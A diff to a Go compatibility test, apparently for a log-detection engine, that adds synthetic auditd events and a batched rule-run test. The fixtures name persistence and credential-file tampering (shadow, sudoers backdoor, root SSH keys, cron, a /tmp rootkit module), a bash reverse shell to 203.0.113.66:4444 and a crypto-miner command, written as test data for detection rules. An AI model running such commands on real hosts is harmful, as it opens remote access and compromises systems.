@@ -9,6 +9,7 @@ import (
 	"os"
 	"slices"
 	"sort"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -293,8 +294,12 @@ func (c *corpus) network() {
 		c.n++
 		ts := compatT0.Add(at).In(loc)
 		raw := strings.NewReplacer("{bsd}", ts.Format(time.Stamp), "{date}", ts.Format("2006-01-02"),
-			"{time}", ts.Format("15:04:05"), "{udate}", ts.UTC().Format("2006-01-02"), "{utime}", ts.UTC().Format("15:04:05")).Replace(line)
+			"{time}", ts.Format("15:04:05"), "{udate}", ts.UTC().Format("2006-01-02"), "{utime}", ts.UTC().Format("15:04:05"),
+			"{unix}", strconv.FormatInt(ts.Unix(), 10)).Replace(line)
 		src := "syslog:udp"
+		if strings.HasPrefix(raw, "node=") {
+			src = "file:auditd"
+		}
 		if strings.HasPrefix(raw, "{") {
 			src = "entra:signin"
 			if strings.Contains(raw, `"sc-status"`) {
@@ -432,6 +437,47 @@ func (c *corpus) syslogSources(add func(at, late time.Duration, line string)) {
 		add(at(1200+i*2), 0, fmt.Sprintf(iis, "192.168.1.60", "", "401", "2"))
 		add(at(1201+i*2), 0, fmt.Sprintf(iis, "192.168.1.60", "jan", "200", "0"))
 	}
+
+	// auditd (1.8.1): zdarzenia agenta Linux (rekordy zgrupowane) – po
+	// jednym dla każdej reguły i podobne, które reguł nie spełniają.
+	serial := 5000
+	au := func(s int, recs ...string) {
+		serial++
+		lines := make([]string, len(recs))
+		for i, r := range recs {
+			typ, rest, _ := strings.Cut(r, " ")
+			lines[i] = fmt.Sprintf("node=web02 type=%s msg=audit({unix}.000:%d): %s", typ, serial, rest)
+		}
+		add(at(s), 0, strings.Join(lines, "\n"))
+	}
+	sys := func(key, exe string, auid int) string {
+		return fmt.Sprintf(`SYSCALL arch=c000003e syscall=257 success=yes exit=3 ppid=900 pid=901 auid=%d uid=0 euid=0 ses=3 comm="%s" exe="%s" key="%s"`+
+			"\x1dSYSCALL=openat AUID=\"jan\" UID=\"root\"", auid, exe[strings.LastIndex(exe, "/")+1:], exe, key)
+	}
+	file := func(s int, key, exe, path string) {
+		au(s, sys(key, exe, 1000), `PATH item=0 name="`+path+`" nametype=NORMAL`, "EOE ")
+	}
+	exec := func(s int, exe string, args ...string) {
+		ex := fmt.Sprintf("EXECVE argc=%d", len(args))
+		for i, a := range args {
+			ex += fmt.Sprintf(` a%d="%s"`, i, a)
+		}
+		au(s, strings.Replace(sys("vardr_exec", exe, 1000), "syscall=257", "syscall=59", 1), ex, `CWD cwd="/home/jan"`, "EOE ")
+	}
+	au(1400, `CONFIG_CHANGE auid=1000 ses=3 op=remove_rule key="vardr_identity" list=4 res=1`+"\x1dAUID=\"jan\"")
+	au(1401, `CONFIG_CHANGE auid=4294967295 ses=4294967295 op=add_rule key="vardr_identity" list=4 res=1`)
+	file(1410, "vardr_identity", "/usr/bin/vi", "/etc/shadow")
+	file(1411, "vardr_identity", "/usr/sbin/useradd", "/etc/passwd")
+	file(1420, "vardr_sudoers", "/usr/bin/tee", "/etc/sudoers.d/99-backdoor")
+	file(1430, "vardr_ssh_keys", "/usr/bin/bash", "/root/.ssh/authorized_keys")
+	file(1440, "vardr_cron", "/usr/bin/crontab", "/var/spool/cron/crontabs/root")
+	file(1441, "vardr_systemd", "/usr/bin/dpkg", "/etc/systemd/system/nginx.service")
+	au(1450, strings.Replace(strings.Replace(sys("vardr_modules", "/usr/sbin/kmod", 1000), "syscall=257", "syscall=313", 1), "SYSCALL=openat", "SYSCALL=finit_module", 1),
+		"PROCTITLE proctitle=696E736D6F64002F746D702F726B2E6B6F", "EOE ")
+	au(1451, strings.Replace(strings.Replace(sys("vardr_modules", "/usr/sbin/kmod", 4294967295), "syscall=257", "syscall=313", 1), "SYSCALL=openat", "SYSCALL=finit_module", 1), "EOE ")
+	exec(1460, "/usr/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1")
+	exec(1470, "/tmp/.x/kworker", "/tmp/.x/kworker", "-o", "pool.example:3333")
+	exec(1480, "/usr/bin/ls", "ls", "-la", "/tmp")
 }
 
 type hitKey struct{ rule, event, group string }
@@ -598,6 +644,33 @@ func TestEngineCompatibility(t *testing.T) {
 				from = res.Next
 			}
 			diffSets(t, "przebiegi z limitem wierszy", hitSet(stream), hitSet(paged))
+
+			// Reguły w wielu porcjach (krótki limit SQL), też z limitem wierszy:
+			// granica jednej porcji obcina pozostałe – bez zgubionych i
+			// podwójnych trafień.
+			for _, maxRows := range []int{0, 7} {
+				batched := &Index{Conn: conn, Table: "compat_test.events", MaxRows: maxRows, BatchSQL: 2000}
+				var got []alerts.Hit
+				from := Cursor{Ingested: cuts[0]}
+				for runs := 0; ; runs++ {
+					res, err := batched.Run(ctx, IndexRules(rules), from, to)
+					if err != nil {
+						t.Fatal(err)
+					}
+					got = append(got, res.Hits...)
+					if !res.More {
+						break
+					}
+					if runs > 1000 || !(res.Next.Ingested.After(from.Ingested) || res.Next.EventID > from.EventID) {
+						t.Fatalf("kursor nie posuwa się: %+v → %+v", from, res.Next)
+					}
+					from = res.Next
+				}
+				if len(got) != len(hitSet(got)) && maxRows == 0 {
+					t.Errorf("porcje: podwójne trafienia (%d, unikalne %d)", len(got), len(hitSet(got)))
+				}
+				diffSets(t, fmt.Sprintf("porcje reguł, limit wierszy %d", maxRows), hitSet(stream), hitSet(got))
+			}
 		}
 	}
 }
